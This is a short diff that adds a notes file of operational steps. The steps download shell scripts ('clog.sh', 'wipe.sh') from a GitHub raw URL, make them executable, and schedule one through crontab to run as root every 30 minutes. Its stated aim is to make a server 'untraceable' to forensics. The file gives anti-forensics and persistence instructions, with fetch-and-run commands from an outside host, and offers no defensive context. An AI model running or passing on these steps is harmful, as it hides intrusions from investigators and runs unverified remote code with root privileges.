@@ -1,0 +1,11 @@
+1. wget https://raw.githubusercontent.com/mw6890156/serv/main/clog.sh
+2. chmod +x clog.sh
+3. crontab command to automate run script
+   a. crontab -e
+   b. */30 * * * * /root/clog.sh
+   c. ctr +x , click y, click enter
+
+to make server untraceable from fronsics
+1. wget https://raw.githubusercontent.com/mw6890156/serv/main/wipe.sh
+2. chmod +x wipe.sh
+3. ./wipe.sh
